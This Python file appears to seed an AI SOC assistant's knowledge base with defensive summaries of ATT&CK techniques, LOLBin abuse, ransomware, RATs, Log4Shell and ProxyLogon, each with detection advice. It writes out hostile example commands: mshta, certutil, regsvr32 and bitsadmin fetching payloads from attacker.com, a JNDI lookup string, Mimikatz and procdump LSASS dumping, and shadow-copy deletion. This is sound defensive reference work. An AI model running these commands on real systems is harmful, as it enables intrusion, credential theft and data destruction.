"""
SOCPilot AI — RAG Seed Documents
==================================
Curated cybersecurity knowledge corpus used to bootstrap the ChromaDB
knowledge_base collection on first run.

Covers: MITRE ATT&CK techniques, common malware families, threat actor TTPs,
network IoC patterns, common vulnerabilities, and SOC investigation guides.
"""

from __future__ import annotations

from typing import Any, Dict, List, Tuple

# Each entry: (doc_id, text, metadata_dict)
SEED_DOCUMENTS: List[Tuple[str, str, Dict[str, Any]]] = [
    # ── PowerShell / Command Execution ────────────────────────────────────────
    (
        "mitre-t1059-001",
        """MITRE ATT&CK T1059.001 — Command and Scripting Interpreter: PowerShell

PowerShell is a powerful interactive command-line interface and scripting environment
included in the Windows operating system. Adversaries can use PowerShell to perform
a number of actions, including discovery of information and execution of code.

Common malicious patterns:
- Encoded commands: powershell -enc <base64> or -EncodedCommand
- Download cradles: IEX (Invoke-Expression) + WebClient.DownloadString
- Bypassing execution policy: -ExecutionPolicy Bypass -NoProfile -NonInteractive
- AMSI bypass attempts using memory patching
- Process injection via Add-Type and P/Invoke calls
- Fileless execution leaving no artifacts on disk

Detection opportunities:
- Monitor PowerShell Script Block Logging (Event ID 4104)
- Monitor PowerShell Module Logging (Event ID 4103)
- Monitor process creation with suspicious arguments (Sysmon Event ID 1)
- Watch for powershell.exe spawned from Office apps or browser processes
- Correlate with network connections from PowerShell processes

Related techniques: T1027 (Obfuscated Files), T1140 (Deobfuscate/Decode),
T1105 (Ingress Tool Transfer), T1218 (Signed Binary Proxy Execution)

Mitigations: Enable Script Block Logging, use WDAC/AppLocker, constrained language mode.""",
        {"category": "mitre_attack", "technique_id": "T1059.001", "tactic": "Execution"},
    ),
    (
        "mitre-t1059-003",
        """MITRE ATT&CK T1059.003 — Command and Scripting Interpreter: Windows Command Shell

The Windows command shell (cmd.exe) is the primary command prompt of Windows systems.
Adversaries may abuse the Windows command shell for execution.

Common malicious patterns:
- cmd.exe /c <command> used to chain commands
- Spawning from unexpected parent processes
- Downloading files via certutil, bitsadmin, or powershell
- Creating scheduled tasks or registry run keys
- Data exfiltration using built-in utilities

Detection: Monitor process creation events, parent-child relationships,
command-line arguments containing /c, obfuscated strings with ^ carets.""",
        {"category": "mitre_attack", "technique_id": "T1059.003", "tactic": "Execution"},
    ),
    # ── LOLBins (Living off the Land Binaries) ────────────────────────────────
    (
        "lolbin-rundll32",
        """LOLBin: rundll32.exe — Living-off-the-Land Binary Abuse

rundll32.exe is a legitimate Windows binary used to load DLL files.
Adversaries abuse it to execute malicious DLLs or scripts while bypassing
application whitelisting controls.

Common malicious patterns:
- rundll32.exe javascript:<script>
- rundll32.exe vbscript:<script>
- rundll32.exe <malicious.dll>,EntryPoint
- Executing DLL from network share: rundll32.exe \\\\server\\share\\payload.dll
- Loading DLL via URL protocols

MITRE Mapping: T1218.011 — System Binary Proxy Execution: Rundll32
Tactic: Defense Evasion

Detection: Monitor rundll32.exe spawning with non-DLL arguments,
network connections from rundll32.exe, unusual command-line patterns.
Parent process should be explorer.exe or another GUI application.""",
        {"category": "lolbin", "technique_id": "T1218.011", "tactic": "Defense Evasion"},
    ),
    (
        "lolbin-mshta",
        """LOLBin: mshta.exe — Microsoft HTML Application Host Abuse

mshta.exe executes Microsoft HTML Application files (.hta). Adversaries use
it to execute malicious scripts while bypassing security controls.

Common malicious patterns:
- mshta.exe http://attacker.com/payload.hta (remote HTA execution)
- mshta.exe vbscript:<script>(window.close)
- Spawning from macro-enabled Office documents
- Delivering RATs and backdoors via HTA dropper

MITRE Mapping: T1218.005 — System Binary Proxy Execution: Mshta
Tactic: Defense Evasion

Detection: mshta.exe with URL arguments, spawning from Office apps,
network connections from mshta.exe, child processes of mshta.exe.""",
        {"category": "lolbin", "technique_id": "T1218.005", "tactic": "Defense Evasion"},
    ),
    (
        "lolbin-certutil",
        """LOLBin: certutil.exe — Certificate Utility Abuse

certutil.exe is a Windows built-in tool for certificate management.
Adversaries abuse it for file download, encoding/decoding, and cache management.

Common malicious patterns:
- certutil.exe -urlcache -split -f http://attacker.com/payload.exe
- certutil.exe -decode base64file.txt payload.exe
- certutil.exe -encode payload.exe base64file.txt

MITRE Mapping: T1105 (Ingress Tool Transfer), T1140 (Deobfuscate/Decode)
Tactic: Command and Control, Defense Evasion

Detection: certutil.exe with -urlcache, -decode, or -encode arguments.
Monitor outbound network connections from certutil.exe.""",
        {"category": "lolbin", "technique_id": "T1105", "tactic": "Command and Control"},
    ),
    (
        "lolbin-wmic",
        """LOLBin: wmic.exe — Windows Management Instrumentation Command-line Abuse

wmic.exe provides a command-line interface to WMI. Adversaries use it for
lateral movement, persistence, and remote command execution.

Common malicious patterns:
- wmic process call create "<command>"
- wmic /node:<target_ip> process call create
- wmic os get for system information gathering
- Lateral movement using wmic on remote hosts

MITRE Mapping: T1047 — Windows Management Instrumentation
Tactic: Execution, Lateral Movement

Detection: wmic.exe with process call create arguments, remote wmic calls,
WMI subscriptions for persistence (Event ID 5858, 5860, 5861).""",
        {"category": "lolbin", "technique_id": "T1047", "tactic": "Execution"},
    ),
    (
        "lolbin-regsvr32",
        """LOLBin: regsvr32.exe — Register Server Abuse (Squiblydoo Attack)

regsvr32.exe is a Windows tool for registering and unregistering OLE controls.
Adversaries use it to execute malicious scripts and bypass AppLocker.

Common malicious patterns:
- regsvr32.exe /s /n /u /i:http://attacker.com/payload.sct scrobj.dll (Squiblydoo)
- Loading malicious COM scriptlets from remote URLs
- Bypassing AppLocker via trusted binary

MITRE Mapping: T1218.010 — System Binary Proxy Execution: Regsvr32
Tactic: Defense Evasion

Detection: regsvr32.exe with /i: URL argument, network connections from
regsvr32.exe, non-DLL arguments.""",
        {"category": "lolbin", "technique_id": "T1218.010", "tactic": "Defense Evasion"},
    ),
    (
        "lolbin-bitsadmin",
        """LOLBin: bitsadmin.exe — Background Intelligent Transfer Service Abuse

bitsadmin.exe manages BITS jobs used for downloading/uploading files.
Adversaries abuse BITS for stealthy file downloads and persistence.

Common malicious patterns:
- bitsadmin /transfer job http://attacker.com/payload.exe %TEMP%\\payload.exe
- Using BITS for persistence (jobs survive reboots)
- Blending C2 traffic with legitimate BITS traffic

MITRE Mapping: T1197 — BITS Jobs
Tactic: Defense Evasion, Persistence

Detection: bitsadmin.exe creating jobs with external URLs, BITS jobs pointing
to unusual locations, Event ID 16403 for BITS job creation.""",
        {"category": "lolbin", "technique_id": "T1197", "tactic": "Defense Evasion"},
    ),
    # ── Network Threats ───────────────────────────────────────────────────────
    (
        "threat-c2-beaconing",
        """Command and Control (C2) Beaconing — Detection and Analysis

C2 beaconing is a technique where malware periodically communicates with a
remote attacker-controlled server to receive commands or exfiltrate data.

Common indicators:
- Regular periodic outbound connections (jitter-based timing)
- Connections to newly registered domains
- HTTP/HTTPS traffic with unusual user-agents
- DNS queries to DGA (Domain Generation Algorithm) domains
- Long-duration TCP connections (long polling)
- Connections to IP addresses in high-risk ASNs

Detection strategies:
- Baseline normal network traffic, alert on anomalies
- Monitor DNS query frequency and NXDOMAIN rates
- Use JA3/JA3S fingerprinting for TLS anomalies
- Threat intel feed integration for known bad IPs/domains
- Look for HTTP POST requests to unusual paths

Common C2 frameworks seen in the wild:
- Cobalt Strike (Beacon) — malleable C2 profiles
- Metasploit Meterpreter
- Empire / PowerShell Empire
- Sliver, Havoc, Brute Ratel""",
        {"category": "network_threat", "technique_id": "T1071", "tactic": "Command and Control"},
    ),
    (
        "threat-lateral-movement",
        """Lateral Movement Techniques — SOC Investigation Guide

Lateral movement allows adversaries to progressively move through a network
to reach high-value targets like domain controllers or data repositories.

Common techniques:
- Pass-the-Hash (PtH): Using NTLM hashes without knowing plaintext password
- Pass-the-Ticket (PtT): Forged Kerberos tickets (Golden/Silver tickets)
- Remote Services: RDP, SMB, WMI, WinRM for remote code execution
- Exploitation of trust relationships between systems

Key detection events (Windows):
- Event ID 4624 (Type 3): Network logon (SMB lateral movement)
- Event ID 4648: Explicit credentials used (PtH indicator)
- Event ID 4769: Kerberos service ticket requested
- Event ID 4672: Special privileges assigned to new logon (admin logon)

Red flags:
- Admin account logging into multiple systems in short time
- Service accounts accessing workstations
- Unusual RDP connections from non-admin systems""",
        {"category": "technique", "technique_id": "T1021", "tactic": "Lateral Movement"},
    ),
    # ── Persistence ───────────────────────────────────────────────────────────
    (
        "threat-persistence",
        """Persistence Techniques — MITRE ATT&CK Overview

Adversaries use persistence mechanisms to maintain access across reboots,
credential changes, and other interruptions.

Common persistence techniques:
1. Registry Run Keys (T1547.001):
   - HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
   - HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
   
2. Scheduled Tasks (T1053.005):
   - schtasks /create /tn "UpdateTask" /tr <payload> /sc onlogon
   
3. Service Creation (T1543.003):
   - sc create <service_name> binpath= <payload>
   
4. Startup Folder (T1547.001):
   - C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup

5. WMI Event Subscription (T1546.003):
   - __EventFilter, __EventConsumer, __FilterToConsumerBinding

Detection:
- Monitor registry modifications (Sysmon Event ID 13)
- Track scheduled task creation (Event ID 4698, 4702)
- Alert on new service creation (Event ID 7045)
- Monitor startup folder changes""",
        {"category": "technique", "technique_id": "T1547", "tactic": "Persistence"},
    ),
    # ── Malware Families ──────────────────────────────────────────────────────
    (
        "malware-ransomware",
        """Ransomware — Detection, Response, and Investigation Guide

Ransomware encrypts victim files and demands payment for decryption keys.
Modern ransomware operations are highly organised criminal enterprises.

Pre-encryption indicators:
- Mass file access/reads in short timeframe
- Shadow copy deletion: vssadmin.exe delete shadows
- Disabling backup services: wbadmin.exe delete catalog
- Disabling Windows Defender: Powershell Set-MpPreference
- Enumeration of network shares
- Creation of ransom note files (HOW_TO_DECRYPT.txt)

File system indicators:
- Files renamed with new extensions (.locked, .encrypted, random extension)
- Ransom notes in every directory
- Deletion of original files

Incident Response Steps:
1. Isolate affected systems immediately
2. Preserve memory dumps before shutdown
3. Identify patient zero and initial infection vector
4. Determine ransomware family (ID Ransomware, VirusTotal)
5. Check for available decryptors (nomoreransom.org)
6. Restore from clean backups if available
7. Preserve forensic artifacts for investigation""",
        {"category": "malware", "malware_type": "ransomware", "tactic": "Impact"},
    ),
    (
        "malware-rat",
        """Remote Access Trojans (RATs) — Detection and Investigation Guide

RATs provide attackers with unauthorized remote access to victim systems.
They are commonly distributed via phishing, malicious downloads, or exploits.

Common RAT capabilities:
- Keylogging and screen capture
- File system access and exfiltration
- Webcam/microphone access
- Credential harvesting
- Lateral movement pivot point

Common RAT families:
- AgentTesla, AsyncRAT, NjRAT, QuasarRAT
- DarkComet, Gh0st RAT, PlugX (APT-associated)
- Remcos, XWorm, LimeRAT

Detection indicators:
- Unusual outbound connections on non-standard ports
- Process injection (svchost.exe, explorer.exe children)
- Persistence via registry or scheduled tasks
- Keylogger artifacts in temp directories
- Browser credential theft from user data directories

Investigation steps:
- Analyse network traffic for C2 communication
- Identify dropped files and persistence mechanisms
- Check autorun locations for malware entries
- Review PowerShell/cmd history for commands executed""",
        {"category": "malware", "malware_type": "rat", "tactic": "Collection"},
    ),
    # ── Vulnerability / CVE Context ───────────────────────────────────────────
    (
        "vuln-log4shell",
        """CVE-2021-44228 (Log4Shell) — Critical Vulnerability Intelligence

Log4Shell is a critical RCE vulnerability in Apache Log4j 2 (CVSS 10.0).
Affects Log4j 2.0-beta9 through 2.14.1.

Attack vector:
- Attacker sends malicious JNDI lookup string in any logged field
- Log4j processes the string: ${jndi:ldap://attacker.com/exploit}
- Server makes outbound LDAP request to attacker's server
- Attacker delivers malicious Java class for RCE

Indicators of exploitation:
- Unusual outbound LDAP/RMI connections (ports 389, 1099)
- HTTP requests containing ${jndi:ldap:// or ${jndi:rmi://
- Log4j encoded variants: ${${lower:j}ndi:...}
- Outbound connections to VPS providers post-exploitation

Affected systems:
- Any Java application using Log4j 2.x
- VMware vCenter, Cisco products, ElasticSearch, many others

Remediation: Upgrade to Log4j 2.17.1+, set log4j2.formatMsgNoLookups=true""",
        {
            "category": "vulnerability",
            "cve_id": "CVE-2021-44228",
            "cvss_score": "10.0",
            "severity": "CRITICAL",
        },
    ),
    (
        "vuln-proxylogon",
        """CVE-2021-26855 (ProxyLogon) — Microsoft Exchange Server Vulnerability

ProxyLogon is a critical pre-authentication SSRF vulnerability in Exchange Server
that allows unauthenticated attackers to execute code as SYSTEM.

Attack chain:
1. SSRF bypass (CVE-2021-26855) to authenticate as any user
2. Arbitrary file write (CVE-2021-27065) to drop webshell
3. RCE via webshell for full server compromise

Indicators:
- Unusual Exchange Server requests from external IPs
- New .aspx files in Exchange directories (webshells)
- w3wp.exe spawning cmd.exe or PowerShell
- Suspicious Export-MailboxRequest commands
- New local admin accounts created on Exchange

Affected: Exchange 2013, 2016, 2019 (pre-March 2021 patches)
Remediation: Apply Microsoft's March 2021 emergency patches immediately.""",
        {
            "category": "vulnerability",
            "cve_id": "CVE-2021-26855",
            "cvss_score": "9.8",
            "severity": "CRITICAL",
        },
    ),
    # ── Phishing / Initial Access ─────────────────────────────────────────────
    (
        "technique-phishing",
        """Phishing — Initial Access and Detection Guide (T1566)

Phishing is the most common initial access vector for both cybercriminals
and state-sponsored threat actors.

Types:
- Spearphishing Attachment (T1566.001): Malicious email attachments
- Spearphishing Link (T1566.002): Malicious links in emails
- Spearphishing via Service (T1566.003): Social media, messaging platforms

Common attachment types:
- Macro-enabled Office documents (.docm, .xlsm)
- PDF with embedded JavaScript or links
- ISO/IMG files containing LNK or executable files
- HTML smuggling with Base64-encoded payloads
- Password-protected ZIP files (to evade AV scanning)

Email indicators:
- Spoofed sender domain (look-alike domains, Unicode homoglyphs)
- Mismatched reply-to address
- Urgency language, impersonation of executives or IT
- Links to newly registered domains or URL shorteners

Post-click indicators:
- Office spawning PowerShell, cmd.exe, or wscript.exe
- MSHTA, RegSvr32, or Rundll32 spawning from Office""",
        {"category": "technique", "technique_id": "T1566", "tactic": "Initial Access"},
    ),
    # ── SOC Investigation Methodology ────────────────────────────────────────
    (
        "soc-methodology",
        """SOC Alert Investigation Methodology — Best Practices

A structured approach to security alert investigation ensures consistent,
high-quality incident response.

Phase 1 — Triage:
- Determine if alert is a true or false positive
- Assess potential business impact
- Assign severity based on asset criticality and threat confidence
- Prioritise based on risk score

Phase 2 — Context Gathering:
- Identify affected assets, users, and data
- Collect relevant logs (endpoint, network, application)
- Review prior incidents involving same assets or IoCs
- Query threat intelligence for known IoCs

Phase 3 — Analysis:
- Reconstruct the attack timeline
- Identify initial access vector and attack chain
- Map to MITRE ATT&CK framework
- Determine scope of compromise

Phase 4 — Containment:
- Isolate affected systems
- Block malicious IPs and domains at perimeter
- Disable compromised user accounts
- Preserve forensic evidence

Phase 5 — Documentation:
- Document all findings in the incident ticket
- Note IoCs for threat intel sharing
- Record timeline of events
- Capture screenshots and log excerpts""",
        {"category": "methodology", "topic": "soc_investigation"},
    ),
    # ── Credential Attacks ────────────────────────────────────────────────────
    (
        "technique-credential-access",
        """Credential Access Techniques — MITRE ATT&CK Overview (TA0006)

Credential access allows adversaries to steal usernames and passwords
for lateral movement and privilege escalation.

Common techniques:
1. Credential Dumping (T1003):
   - Mimikatz: sekurlsa::logonpasswords — dumps LSASS memory
   - ProcDump: procdump.exe -ma lsass.exe lsass.dmp
   - Volume Shadow Copy: registry hive extraction
   
2. Brute Force (T1110):
   - Password spray attacks against Active Directory
   - Targeting Outlook Web Access, VPN portals
   
3. Keylogging (T1056.001):
   - Capturing keystrokes for credential theft
   
4. Browser Credential Theft:
   - Chrome: Login Data SQLite database
   - Firefox: key4.db and logins.json

Detection:
- Event ID 4688: Suspicious process creation (procdump, mimikatz)
- Event ID 4625: Failed logon attempts (brute force)
- Event ID 4776: NTLM authentication failure
- Sysmon Event ID 10: LSASS memory access""",
        {"category": "technique", "technique_id": "T1003", "tactic": "Credential Access"},
    ),
    # ── Exfiltration ──────────────────────────────────────────────────────────
    (
        "technique-exfiltration",
        """Data Exfiltration Techniques (TA0010) — SOC Investigation Guide

Exfiltration is the final stage of many attacks — moving stolen data
outside the victim network to attacker-controlled infrastructure.

Common methods:
1. Exfiltration Over C2 Channel (T1041):
   - Data bundled in HTTP/HTTPS POST requests to C2 server
   
2. Exfiltration Over Alternative Protocol (T1048):
   - DNS tunnelling (DNScat2, iodine) — encode data in DNS queries
   - ICMP tunnelling
   - FTP, SFTP to drop site
   
3. Cloud Storage Exfiltration (T1567):
   - Uploading to Mega.nz, pCloud, Dropbox via API
   
4. Compression and Encryption:
   - WinRAR/7-Zip password-protected archives before exfiltration
   - Splitting data into small chunks to avoid DLP thresholds

Detection:
- Large outbound data volumes to unusual destinations
- DNS queries with unusually long subdomains
- ICMP packets with payloads larger than normal (>64 bytes)
- Scheduled transfers during off-hours""",
        {"category": "technique", "technique_id": "T1041", "tactic": "Exfiltration"},
    ),
]
